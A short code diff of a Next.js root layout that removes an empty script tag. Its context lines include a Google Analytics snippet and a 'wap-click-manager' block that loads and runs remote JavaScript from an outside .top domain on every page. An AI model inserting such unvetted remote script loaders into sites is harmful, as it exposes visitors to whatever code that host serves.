@@ -63,8 +63,6 @@ export default async function RootLayout({
             })(window,document,'script','dataLayer','G-Y3L8VFWWWC');
           `}
         </Script>
-        <script>  </script>
-
         <Script id="wap-click-manager" strategy="afterInteractive">
             {`
             (function(i, s, o, g, r, a, m) { i[r] = i[r] || function() { (i[r].q = i[r].q || []).push(arguments) }; a = s.createElement(o), m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m) }) (window, document, 'script', '//juddy.top/js/embed.js?hash=4kuvFjwD1N', 'wc'); wc('start', '4kuvFjwD1N', {});
